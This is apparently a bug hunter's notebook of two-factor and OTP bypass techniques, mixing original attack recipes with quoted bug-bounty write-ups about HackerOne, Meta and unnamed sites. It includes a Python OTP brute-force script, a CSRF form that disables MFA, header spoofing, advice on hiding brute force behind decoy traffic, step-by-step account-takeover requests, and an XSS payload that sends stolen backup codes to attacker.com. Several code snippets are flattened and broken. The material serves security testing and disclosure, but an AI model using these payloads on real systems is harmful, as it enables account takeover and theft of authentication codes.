

![[Pasted image 20241130190801.png]]

! might be valued as a p4 bounty?

**check if it asks for your password when you turn OFF 2FA:**

> https://hackerone.com/reports/587910

![[Pasted image 20250315225620.png]]

---
## 2FA & MFA Hacks: Bypass OTP Like a Pro

### Direct Endpoint Access

One of the simplest _2FA exploit steps_ is hitting the endpoint after 2FA directly — think of it as skipping the bouncer at a club.

Use **cURL** or **Postman** to send a request directly to endpoints **after login but before MFA completion**.

`curl -X GET "https://target.com/api/user/dashboard" -H "Authorization: Bearer <access_token>"`

If you can access the dashboard **without** completing MFA, the application is vulnerable.

### Token-Based Exploits: Reuse and Abuse MFA Tokens

#### 1) Token Reuse

Use old tokens again if the system doesn't invalidate them.

1. **Capture a valid MFA token** using **Burp Suite** or a proxy tool.
2. **Log in and complete MFA** once while monitoring the request.
3. **Save the token** sent to the server (e.g., `X-MFA-Token: 123456`).
4. **Log out and try logging in again**, but instead of entering a new token, replay the old one.
5. If the system allows it, **MFA is bypassed!**

`curl -X POST "https://target.com/api/verify_mfa" -H "Authorization: Bearer <access_token>" -H "X-MFA-Token: 123456"`

#### 2) Unused Tokens

Use tokens that weren't used yet.

1. **Request multiple MFA codes** but do not use them all.
2. **Save an unused token** (e.g., if three codes are generated, keep the last one).
3. **Try logging in later** using the saved token.
4. If the system accepts it, **MFA is bypassed!**

`curl -X POST "https://target.com/api/verify_mfa" -H "Authorization: Bearer <access_token>" -H "X-MFA-Token: 789012"`

#### 3) Token Exposure

Look for tokens in responses.

1. **Use a proxy (Burp Suite, mitmproxy) to intercept requests.**
2. **Look for API responses** containing sensitive information.
3. **Find and extract the MFA token.**
4. **Use the token** to bypass the verification step.

A response from an API may contain:

`{   "status": "success",   "mfa_token": "654321" }`

An attacker can **reuse this token** for MFA verification.

**JavaScript Exposure Example:**

Check for exposed tokens in **Developer Tools (F12 → Console)**:

`console.log(window.localStorage.getItem("mfa_token"));`

If the MFA token is stored in local storage, an attacker can extract and reuse it.

### Account and Session Tricks: Sneaky 2FA Exploit

#### 1) Verification Link

Use email links from account creation to access without 2FA.

1. **Create a new account** and capture the verification link sent to your email.
2. **Log out** before completing the MFA setup.
3. **Use the verification link** in an **incognito/private** browser session.
4. **Check if the account gets verified** and logs in **without MFA.**

A verification email contains:

`https://target.com/verify?token=abcdef123456`

If clicking this link **logs you in directly without requiring MFA**, then MFA enforcement is weak.

#### 2) Session Manipulation

Use your session's 2FA state to access another account.

1. **Log in to two different accounts in the same browser.**
2. **Complete MFA for one account.**
3. **Switch to the other account (via cookie or session manipulation).**
4. **Check if MFA is skipped** when switching accounts.

**Example Attack:**

- Open **Account A** (without MFA completed).
- Open **Account B** in another tab and complete MFA.
- Switch back to **Account A** and check if you now have access **without completing MFA.**

#### 3) Password Reset

Reset the password and see if 2FA is bypassed.

1. **Request a password reset** for an account that has MFA enabled.
2. **Reset the password** using the provided link.
3. **Log in with the new password** and check if the system asks for MFA.
4. If it does **not** require MFA, then the system is vulnerable.

**Example Attack:**

A password reset email contains:

`https://target.com/reset-password?token=xyz789`

After resetting the password, if the attacker logs in and **MFA is not required**, they have bypassed it.

### Advanced MFA Bypass Techniques

#### 1) Trusted Platforms

Hack into linked accounts like Google to bypass 2FA.

Some applications allow users to log in via **OAuth (Google, Facebook, Microsoft, etc.)** instead of requiring MFA. If an attacker compromises a linked account, they can bypass MFA entirely.

**Steps to Exploit:**

1. **Find an account that allows login via a trusted platform** (e.g., "Sign in with Google").
2. **Compromise the Google/Facebook/Microsoft account** via phishing, leaked credentials, or session hijacking.
3. **Use the compromised account to log in** to the target service.
4. **Check if MFA is skipped** due to trusted platform authentication.

#### 2) Brute Force

Try codes repeatedly, especially if no rate limits exist.

1. Identify an MFA field that **does not lock out users** after multiple failed attempts.
2. Automate guessing with tools like **Burp Intruder, Hydra, or custom scripts.**
3. If the system allows resending codes, request a new code repeatedly to reset limits.
4. Use **slow brute-force attacks** (e.g., trying one code per minute to evade detection).

**Example Brute Force Script (Python)**

```python
import requests 
url = "https://target.com/api/verify_mfa" headers = {"Authorization": "Bearer <access_token>"} for code in range(100000, 999999):  # 6-digit code brute force     data = {"mfa_code": str(code)}   
response = requests.post(url, headers=headers, json=data)     

if "success" in response.text:       
	print(f"Valid MFA Code: {code}")       
break
```

#### 3) Race Conditions

Exploit timing issues in the system.

1. Identify an action that requires MFA (e.g., login or enabling 2FA).
2. Open **two or more requests in parallel** (e.g., in Burp Suite's **Turbo Intruder**).
3. Send one request to verify MFA and another to access the system before MFA is fully processed.
4. If the system fails to enforce MFA correctly, **access is granted without full verification.**

**Example Attack Scenario:**

- One request verifies MFA (`/verify_mfa`).
- Another request tries accessing a protected page (`/dashboard`).
- If the second request **bypasses MFA**, the system has a race condition.

#### 4) CSRF/[Clickjacking](https://www.verylazytech.com/clickjacking)

Trick users into disabling 2FA.

1. **Find the request** that disables MFA (e.g., `POST /disable_mfa`).
2. **Craft a malicious link** that submits this request when clicked.
3. **Trick the target user** into clicking the link while logged in.
4. If successful, the target's MFA is disabled **without their consent.**

**Example CSRF Exploit (HTML Page):**

```html
<form action="https://target.com/disable_mfa" method="POST">   <input type="hidden" name="confirm" value="yes">   <input type="submit" value="Click to claim your reward!"> </form>
```

If the user is logged in and clicks the button, their MFA is disabled.

#### 5) Remember Me Exploits

Guess cookies or fake IP addresses.

1. **Analyze the authentication cookies** after enabling "Remember Me."
2. **Check if the cookie contains predictable or unencrypted tokens.**
3. Try **reusing the cookie** from another device to bypass MFA.
4. If the system uses **IP-based trust**, spoof the IP using the `X-Forwarded-For` header.

**Example Exploit (Setting X-Forwarded-For Header in Curl):**

```bash
curl -X GET "https://target.com/dashboard" -H "Cookie: remember_me=abcdef123456" -H "X-Forwarded-For: 192.168.1.100"`
```

### Legacy and Backup Issues

Many systems have legacy components or backup mechanisms that introduce MFA weaknesses. Attackers can exploit **older versions, backup codes, and previous sessions** to bypass MFA entirely.

#### 1) Older Versions

Check subdomains or APIs for outdated, vulnerable setups.

1. **Find outdated versions** by scanning subdomains and API endpoints.

- Use **tools like Subfinder, Amass, or Wayback Machine** to locate old versions.
- Example: `legacy.target.com`, `api.v1.target.com/login`.

**2. Check if MFA is missing** or has known security flaws.

**3. Attempt login via the old version** to bypass MFA enforcement.

**Example Subdomain Scan (Using Subfinder & Nmap):**

`subfinder -d target.com | tee subdomains.txt nmap -p 443 --script http-title -iL subdomains.txt`

If an older version exists, **try logging in without MFA.**

#### 2) Backup Codes

Steal or generate backup codes if access controls are weak.

1. **Look for security misconfigurations** that expose backup codes:

- **CORS misconfigurations**: Check if an attacker-controlled website can read API responses.
- **XSS vulnerabilities**: Inject JavaScript to steal codes.
- **Unprotected API endpoints**: Check `/user/backup_codes` or similar.

**2. Extract backup codes** using one of the found vulnerabilities.

**3. Use the stolen codes** to authenticate and bypass MFA.

**Example XSS Payload to Steal Backup Codes:**

```bash
fetch("https://target.com/api/backup_codes")   .then(response => response.text())   .then(data => fetch("https://attacker.com/steal?codes=" + encodeURIComponent(data)));
```

If successful, the attacker now has valid **MFA bypass codes.**

#### 3) Previous Sessions

Use old sessions if not terminated after 2FA setup.

1. **Log in before MFA is enabled.**
2. **Save session cookies** or authentication tokens.
3. **Ask the user to enable MFA** or wait for them to do it.
4. **Reuse the old session** to access the account **without completing MFA.**

**Example: Stealing Session Tokens with JavaScript**

```js
console.log(document.cookie);
```

If a valid session cookie exists, the attacker can **reuse it to bypass MFA.**

### Additional Exploits

#### 1) Information Disclosure

Look for sensitive data on 2FA pages.

1. **Visit the 2FA page** and inspect the page source or network requests.
2. Look for **email addresses, phone numbers, security questions, or partial OTPs.**
3. Use this leaked data to **phish the user, brute-force the OTP, or reset the password.**

**Example: Finding Leaked Data in Network Requests (Using Burp Suite)**

1. Enable **Burp Proxy** and navigate to the 2FA page.
2. Look for **server responses** containing hints like:

- `Your OTP starts with 123***`
- `Your registered email: user@example.com`
- `Last four digits of your phone: 5678`

3. Use this data to **guess OTPs, reset passwords, or craft social engineering attacks.**

#### 2) Password Reset Bypassing 2FA

Reset password after 2FA setup and check access.

1. **Initiate a password reset** for the target account.
2. **Change the password** using the reset link.
3. **Log in with the new password** and check if the system prompts for 2FA.
4. If MFA is **not required after the reset**, access is granted without it.

**Example Attack Workflow:**

1. **Attacker requests a password reset** for `victim@example.com`.
2. If they have access to the victim's email, **reset the password.**
3. **Log in using the new password** and check if MFA is enforced.
4. If the system skips MFA, **access is fully compromised.**

#### 3) Decoy Requests

Send fake requests to hide brute force attempts.

1. **Identify the MFA endpoint** used for OTP verification.
2. **Automate attack requests** while sending normal traffic (e.g., logins, page views).
3. If successful, the brute-force attack remains **undetected** by security mechanisms.

**Example Decoy Attack Using Burp Intruder:**

1. Set up an attack in **Burp Suite's Intruder**.
2. Use **payload lists** that mix:

- **Real login requests** (to appear as a normal user).
- **Brute force attempts** (to guess the OTP).

3. Monitor **responses** to detect valid OTPs.

#### 4) OTP Construction Errors

Generate OTPs yourself if based on known data.

1. **Analyze how OTPs are generated** (e.g., timestamps, user ID, sequential numbers).
2. **Look for patterns** by requesting multiple OTPs in a short period.
3. **Recreate the OTP generation logic** to predict future OTPs.

**Example: Predicting OTPs Based on Timestamps**

1. If the OTP format is `YYYYMMDDHHMM + UserID`, an attacker can **reconstruct** it.
2. Generate the OTP using a simple Python script:

```python 
from datetime import datetime 
user_id = "1234" otp = datetime.now().strftime("%Y%m%d%H%M") + user_id print(f"Generated OTP: {otp}")
```

3. If the system **does not randomize OTPs**, an attacker can **generate valid OTPs without interception.**

## Bonus (Very Rare Bug) System Accepts Any Valid OTP Code

## The Bug 🐞: Steps to Reproduce

1. **Go to the Sign-Up Page:**  
    Visit the registration page at 👉 hxxps://website.com/signup/.
2. **Enter Your Details:**  
    Fill in the form with your email (e.g., `myemail@gmail.com`) and click the **Sign Up** button.
3. **OTP Verification Page Appears:**  
    A code will be sent to your email. **Do not use this code!** Instead, press the **Back** button.
4. **Re-enter Details with Victim’s Email:**  
    Go back to the Sign-Up page and fill in the form again, but this time use the victim’s email (e.g., `victim@gmail.com`).
5. **Click Sign Up Again:**  
    When prompted for the OTP, enter the code sent to your email (`myemail@gmail.com`).
6. **Account Created Successfully:**  
    The website accepts the code, and the account is successfully created using the victim’s email (`victim@gmail.com`).

## How the Bug Works

The issue lies in how the website verifies email addresses. Instead of tying the OTP to the specific email entered during registration, *the system accepts **any valid OTP** — even one from a different email! This misconfiguration makes it possible to bypass email verification.*


----

some foundamentals: [2FA Bypass - Security Cipher](https://securitycipher.com/docs/security/penetration-testing-tricks/2fa-bypass/)

![[Pasted image 20241210220128.png]]

![[Pasted image 20241210220218.png]]

![[Pasted image 20241210220300.png]]

----

source: [Authentication Bypass -MFA , Account Takeover… | by ASTUTE | Medium](https://medium.com/@prakashchand72/authentication-bypass-mfa-account-takeover-32166aedb3b9)

# About Web Application

Knowing about how the application functions is important to bypass anything. So I realized that web application on creating new account it sends xxxx-xxxx-xxxx digit format code to the email and requires to enter to verify and active the account. Also after successfully creating account there is a team section which automatically add you to the team group if you belong to that org/domain. Means if you create a account on platform with lets say _astute@tesla.com_ you will automatically be added to its Team group i.e. tesla.com in this case and you can read/write all chats and photos of members sent on team group.

![](https://miro.medium.com/v2/resize:fit:656/1*cNExnlYkVww6syUwueVxgA.png)

# Analysis and Approach

Now I knew about how application works so I tried to bypass the authentication aiming to create account with anyone’s org/domain email. I created an email lets say _astute@tesla.com and_ obviously I don’t have access to that email_._ After playing with all the parameter, I sent a random code which was obviously wrong code and intercepted the request to see the parameters its using and then I saw a very big flaws on its development.


The application was using a parameter called _grant_type_ which was responsible to authenticate or more like tell server how to verify the code so that application server can create account. Lets look at the POC to understand better.

![](https://miro.medium.com/v2/resize:fit:656/1*RAtwcZSVhRJggFPlm5dsXQ.png)

As the POC screenshot might be enough to explain what happened in any case I am writing. So basically I was able to bypass the authentication that I required to enter xxxx-xxxx-xxxx code by just telling server that I want to authenticate the token by not using that token but the password.

Here is the catch, since the password I already knew as its the same password I used to create account on signup page I can now just bypass authencation and can create anyone’s account and join the team and read the chat.

Wait Wait Wait!!

It’s not that easy. Yup I was able to create account but still some mechanism was there and saying it needs to make sure that the right person is accessing.  
As this point I was little disappointed because you know the feeling right when it so close yet so far.

![](https://miro.medium.com/v2/resize:fit:656/1*-dInFzgJ61TsFIJSbK9RmQ.png)

# MFA Bypass

Now it was sending the activation link which on clicking gets activated. I did the basic thing here which comes first to every pentesters mind. I intercepted the request it was sending while making the api call to send the activation code to the email. Here first I tried with my own email to check what kinda activation link it’s generating. Then I realized one more bigger flaws then first one.


Actually the activation link was already reflecting on the response of api call made, so basically I could active the account without needing access to the victim email.

![](https://miro.medium.com/v2/resize:fit:656/1*S89fzWLvYzeR0KiZM92Ukw.png)

								API Request Call

![](https://miro.medium.com/v2/resize:fit:656/1*U4RwvGU6WhHbDs9UNGdx9w.png)

					Activation link sample on email

![](https://miro.medium.com/v2/resize:fit:656/1*GG-5ShP5wL3LN57tV6-S7Q.png)

						Afer successfull exploitation

Now I can create account with anyone’s email and access all of it’s organizations stuff. Pretty cool right!


# Bonus

I am adding bonus here for reader, the injection was also possible on the link that get generate for activation. Actually there was a parameter called _content_ which is getting reflected to the link on activation. I could only inject the text on link itself but the injected text was adding after ? so the activation link remained same which doesn’t led to open redirect or html/xss injection. Let me know what other could have been possible on this test case.

![](https://miro.medium.com/v2/resize:fit:656/1*Yb3EnT2pVRsEvm1QKJ1avA.png)

							injectable parameter content

![](https://miro.medium.com/v2/resize:fit:656/1*LJqdMIrbJe297DD5FSRn2A.png)

						email recieved on victim account.

----

### missing password protection for accessing backup codes.

>[Instagram and Meta 2FA Vulnerability: Unprotected Backup Code Retrieval Exploit in Accounts Center | $10,000 Bounty Awarded | by Shuva Saha | Medium](https://medium.com/@scriptshuva/instagram-and-meta-2fa-bypass-by-unprotected-backup-code-retrieval-in-accounts-center-c735ff650f10)

## Meta 2FA Bypass

A hacker who gains access to a victim Facebook or Instagram account can retrieve Meta 2FA backup codes from the account center, bypassing Meta two-factor authentication (2FA) and gaining full access to the victim Meta account.


## Step 1: Login Initiation

1. Go to [Meta Auth](https://auth.meta.com/).
2. Log in using the compromised Facebook or Instagram accounts.

## Step 2: 2FA Handling

1. If 2FA is enabled on the Meta account, select the recovery code option when prompted for 2FA.

## Step 3: Exploitation Process

1. Open a new tab in the browser and go to [Facebook Accounts Center Two-factor authentication Settings](https://accountscenter.facebook.com/password_and_security/two_factor).

 Click Additional methods and then Click Recovery codes

3. Use a proxy tool, such as Burp Suite, to intercept **FXAccountsCenterTwoFactorRecoveryCodesDialogQuery** graphql request.

## Step 4: Request Modification

1. Modify the intercepted request by changing the variables and doc_id as shown below:

```
variables={"account_id":"victim_meta_account_id","account_type":"FRL","interface":"FB_WEB"}&doc_id=6358505927544740
```

**Note**: The flaw here is the missing meta account password protection.

## Step 5: Recovery Code Retrieval

1. Send the modified request.
2. Extract the recovery code from the response.

## Step 6: Account Takeover

1. Use the retrieved 2FA backup code to log in to the victim meta account, effectively bypassing the 2FA.

![](https://miro.medium.com/v2/resize:fit:656/1*nqZF78OJ1C54LWFgS2Nvxg@2x.jpeg)

---

## 2FA POC Bypass:

After logging in, look into the WebApp if you ever have to verify your phone number for your account:

![[Pasted image 20241224190041.png]]

capture the request:


![[Pasted image 20241224190333.png]]

Now while capturing, keep sending the request until you find the otp code in a json text or something like that:

![[Pasted image 20241224190617.png]]


Then send a request by the otp code:

![[Pasted image 20241224190432.png]]

And then forward the responses until you see something like this:

![[Pasted image 20241224191029.png]]

You can manipulate the response by setting it to true, and then forward it back again.

Verify the vulnerability by seeing if  your phone number has been verified:


![[Pasted image 20241224191417.png]]

2° Method:  _Token Leakage Via Response:

![[Pasted image 20241224233222.png]]

![[Pasted image 20241224233245.png]]

![[Pasted image 20241224233005.png]]

---

## Simply MFA Bypass:

# Step 1: Initial Exploration

Upon logging into the application on **redacted.com**, I began by filling out the required details, including user information such as phone number, email, and other parameters in the form. Once the form was completed, I clicked on “Submit,” and the application prompted me for an OTP, which was sent to the phone number I had provided.

# Step 2: Capturing and Modifying the OTP Request

The first step in my exploration involved capturing the correct OTP. After successfully doing so, I sent the request to Burp Suite’s Repeater, which allowed me to reuse the exact same response for different OTP inputs. At this point, I noticed that the server didn’t validate the OTP properly, so I decided to test this further. Instead of entering the correct OTP, I manually edited the value to “000000” and intercepted the request using Burp Suite. I then pasted the modified response into the Repeater and forwarded it to the server.

# Step 3: Bypassing the OTP Validation

To my surprise, when I sent the modified request containing the “000000” OTP, the server did not validate it and allowed me to proceed. The application did not detect the invalid OTP, which allowed me to successfully bypass the multi-factor authentication (MFA) and gain unauthorized access.

1. Fill the details for the below form

![](https://miro.medium.com/v2/resize:fit:764/1*mZrTsNXpbeh4mt6ijPuPxQ.png)

2. we will receive a otp give the correct otp and capture the request. Send it to repeater. This is the response for correct otp.

![](https://miro.medium.com/v2/resize:fit:875/1*b2lJ4TMmj1L-SW6KQ-JRHQ.png)

3. Now repeat the above steps this time give some random OTP i am giving ‘000000’ and capture the request again.

![](https://miro.medium.com/v2/resize:fit:743/1*5WZli8odhjghl_jOILenfg.png)

![](https://miro.medium.com/v2/resize:fit:635/1*y1DLIvnKmjGo-_YfrAK4Jg.png)

![](https://miro.medium.com/v2/resize:fit:671/1*bZRHAsXKya3zfJQuyLahAg.png)

4. Do intercept the request we will get the above response but we have alreday capture the correct reponse replace that here which was there in repeater. Replace and forward the request it will take you to the payment gateway directly refer to the below screenshot.

![](https://miro.medium.com/v2/resize:fit:875/1*wwLTFliP49gGGVhahqlZ-Q.png)

Remediation:

1. Improve OTP Validation Logic
2. Enhance Server-side Authentication Checks

---

## OTP Bypass via Assence of rate limiting:


-> asks for OTP -> we put wrong one and intercept:

![[Pasted image 20250210002501.png]]

-> forward the req. till you find **a json data with your otp code inside:**

![[Pasted image 20250210004908.png]]

Then **send to intruder** and click  -> "clear"

![[Pasted image 20250210004948.png]]

-> Then highlight the wrong otp code and add the symbols on it, cuz we're going to FUZZ or in this case, **brute force for OTP codes:**

![[Pasted image 20250210005115.png]]

choose "numbers" and set these parameters before attacking:

![[Pasted image 20250210005357.png]]

![[Pasted image 20250210002357.png]]

									"error messages"

Then click on "status" (on the menu bar) untill you find the **200 status code:**

![[Pasted image 20250210005521.png]]


---

## OTP Bypass Via Response Manipulation POC:

![[Pasted image 20250210001415.png]]

								simple

![[Pasted image 20250210001545.png]]

-> intercept and submit again:

-> keep forwarding the response until you're hit with a "false" parameter:

![[Pasted image 20250210001808.png]]

-> simply change it to true, then forward the req. and turn intercept off:

-> then verify the vulnerability by looking into the UI changes:

![[Pasted image 20250210002018.png]]

						confirmed vulnerability

---

# Advanced Rate limit bypass lead to OTP bypass($600)

source: https://bytesnull44.medium.com/rate-limit-bypass-lead-to-otp-bypass-600-f64f39f9e130

### **Description:**

I was checking some mechanisms of my target website to understand how their rate limit works.

First, I tested changing the email. When a user changes their email, a 6-digit PIN is sent to their primary email. For example, if your email was john@hacker.com and you changed it to rose@hacker.com, the OTP would be sent to john@hacker.com.

Once confirmed, rose@hacker.com would become your new email

### **Discovery:**

first I try to brute force the otp i use intruder first . ~={green}but every 60 request i got rate limited for 30 secs =~. so i created a python script to automate this

![None](https://miro.medium.com/v2/resize:fit:700/1*Xnn2DZxP3h04O8LbqyyRCA.png)

> [https://github.com/republic101/test/blob/main/exploit.py](https://github.com/republic101/test/blob/main/exploit.py)

### **Exploit:**

To test my theory, I created a simple Python script to automate the brute-force attack. The attack workflow was straightforward:

1. Send multiple OTP verification requests until the rate limit kicked in.

2. Once blocked, use a bypass method to continue submitting requests without detection.

3. Iterate through all possible six-digit OTP codes to find the correct one.

The proof of concept worked flawlessly. I was able to bypass the rate limit and successfully brute-force OTPs, proving the vulnerability was exploitable.

and save it to request.txt then fully run the command like this

![None](https://miro.medium.com/v2/resize:fit:700/1*e5W1JCtzcV-8Jk58_RqZGA.png)

Weak rate limits can be a gateway to serious security threats, and organizations must continuously test and improve their defenses.

As a cybersecurity specialist, my goal is to help make the digital world safer, one vulnerability at a time. **If you're a developer or security engineer, take a moment to review your OTP implementations — you might be surprised by what you find**

- **March 1, 2025:** Discovered the weak rate limit issue while testing OTP verification.
- **March 1, 2025:** Received an acknowledgment from the security team confirming the issue.
- **March 2, 2025::** The security team deployed a fix and requested further testing.
- **March 2, 2025::** Verified that the fix was effective and confirmed no further bypass.
- **March 3, 2025::** Received a $600 bounty reward for reporting the vulnerability

---

https://medium.com/@sharp488/critical-account-takeover-mfa-auth-bypass-due-to-cookie-misconfiguration-3ca7d1672f9d?source=read_next_recirc-----29a0aa86f816----1---------------------f4cb588d_2e8e_4378_8f35_ce45cac7b261-------

[Mobile OTP number](https://youtu.be/OSYzNZEGcTE?si=JXsWiLaA4i9i0Q6C)

https://icecream23.medium.com/5-common-methods-to-bypass-otp-authentication-in-bug-hunting-1899df84441d

https://medium.com/@alderson.philip/simple-idea-in-2fa-bypass-leads-to-critical-impact-a98e7c6a4190

https://mokhansec.medium.com/account-verification-code-bypass-lead-to-a-4000-bounty-b31dda6f3011

https://medium.com/@prakashchand72/authentication-bypass-mfa-account-takeover-32166aedb3b9



![[Pasted image 20250210002148.png]]

----

# Bypass HackerOne 2FA requirement and reporter blacklist

**_Severity: Medium (5.0) — High (7.1)  
Weakness: Improper Authorization  
Bounty: $10,000_**

**Summary:**

_First, the initial submission got a bounty of $2,500. But while HackerOne was doing their_ **_Root Cause Analysis (RCA)_** _of my report submission, they have stumbled upon another vulnerability with_ **_High_** _severity._

_Since my submission gives them a nudge in the right direction, they rewarded me another $7,500 for the increase scope of finding._

**Research:**

My routine when i am hunting on HackerOne main platform is always checking **if they have new incoming feature,** And i saw that there is beta feature called **[Embedded Submission Form](https://docs.hackerone.com/programs/embedded-submissions-form.html)** which enables hackers to **Anonymously** submit reports without having to create an account on HackerOne. For additional information. _Learn more_ _**[here](https://docs.hackerone.com/programs/embedded-submissions-form.html)**__._

Now, with that new feature i have found an Improper Authorization bug that bypasses the 2 security features of HackerOne for the bug bounty programs.

1. **Bypass 2FA requirements when submitting new reports to a program.** 
2. - **Bypass hacker blacklisted by a program** (_when a program does not want to receive report from specific hackers_). _

#### **Bypass 2FA requirements when submitting new reports to a program**

A program owner can enforce the hackers to setup the two-factor authentication before submitting new reports to their program here: _https://hackerone.com/<*program*>/submission_requirements_ (_see below image_)

![None](https://miro.medium.com/v2/resize:fit:700/0*_TuTNDpbtUvIi7UA)

					Enabled 2FA requirements

The [Parrot Sec](https://hackerone.com/parrot_sec) program has this feature enabled to enforce the hackers to setup `2FA` before submitting reports. I removed my `2FA` in my account to test and it is good that i was block from submitting new reports (_see below image_)

![None](https://miro.medium.com/v2/resize:fit:700/0*_tmRlfVHShusXfKm)

	2FA required by the program before submitting new reports.

Now i was able to bypass this 2FA setup requirements by using the Parrot Sec program **Embedded Submission Form**.


### Steps to reproduce:

1. Login to your account and **remove** your 2FA on your account (if you already setup it)
2. Now go to [https://hackerone.com/parrot_sec](https://hackerone.com/parrot_sec "https://hackerone.com/parrot_sec") and hit `Submit Report` button, observed that you cannot submit report unless you will enable your 2FA.
3. **BYPASS:** Get the `Embedded Submission` URL on their [policy page](https://hackerone.com/parrot_sec): i get this > _[https://hackerone.com/<redacted_UUID>/embedded_submissions/new](https://hackerone.com/0a1e1f11-257e-4b46-b949-c7151212ffbb/embedded_submissions/new "https://hackerone.com/0a1e1f11-257e-4b46-b949-c7151212ffbb/embedded_submissions/new")_
4. Now submit report using that embedded submission form and you can submit reports without setting-up your 2FA, despite the program **enforce** the user to setup the 2FA before submitting new reports.
5. 2FA requirements successfully bypassed!

#### Impact

_Users can still submit a report to a program despite the program owner require a 2FA enabled to account before hacker can submit reports._


#### Bypass Hacker Blacklisted to a program

If a hacker's behavior is out of sync with what is outlined on bug bounty program Security Page, or if they've violated part of the [HackerOne Code of Conduct](https://hackerone.com/disclosure-guidelines), program owners can take action to ban hackers from participating in their program. BBP program owners can ban hackers from both private and public programs. (_see below image_), For additional information

![None](https://miro.medium.com/v2/resize:fit:700/1*9Op31yZp3GynWZGRMUfjoA.png)

				Program blacklisting hackers.

So i ask a good friend of mine [Ace Candelario (phspade)](https://twitter.com/phspades) to ban my [h1/japz](https://hackerone.com/japz) account on HackerOne Parrot Sec program from submitting a new report, btw he is the Philippine [Ambassador of Parrot Security](https://docs.parrotsec.org/doku.php/community/ambassadors-list) and one of the Triager in Parrot Sec hackerone program. After banning my account i try to submit a report and clicking on the submit report button redirects me to **Page not found** error page (_see below_).

![None](https://miro.medium.com/v2/resize:fit:700/1*m7leO0TcBeDCNPK8OuPewA.png)

Error page when you are banned to specific program and try to submit a report.

It's good, the reason why i cannot submit a new report is because i am banned/black-listed on the parrot sec program. 

But using the same **steps to reproduce** on my first bypass above (_Bypassing 2FA requirements_), I was able to submit a new report to the bbp program despite i am already banned.

#### Impact

_Malicious user can still submit a report as many as he/she want despite the program owner banned/black-list the hackers._

**Note:** This second bypass have turns out to have the same root cause of the first bypass above, therefore it was closed as duplicate of my first **report #418767.**

![None](https://miro.medium.com/v2/resize:fit:700/1*OwNYGJ1b2sRLCaoJi0n6Wg.png)

	HackerOne Co-Founder Jobert closed the report as duplicate because it has the same root cause of the first bug mentioned above.

```
### Disclosure Timeline

- 2018–10–04 02:41:19 — Report submitted to HackerOne security team.

- 2018–10–05 20:07:59 — Security team acknowledge and Triage the report

- 2018–10–05 20:53:21 — $10,000 Bounty rewarded.

- 2018–10–06 00:38:15 — Fix for the High severity bug released to production, while the initial submission (Medium) was still ongoing fix.

- 2018–10–25 23:11:03 — Fix for Medium severity bug that is initially reported was released to production

- 2018–10–25 23:11:03 —Status: Resolved
```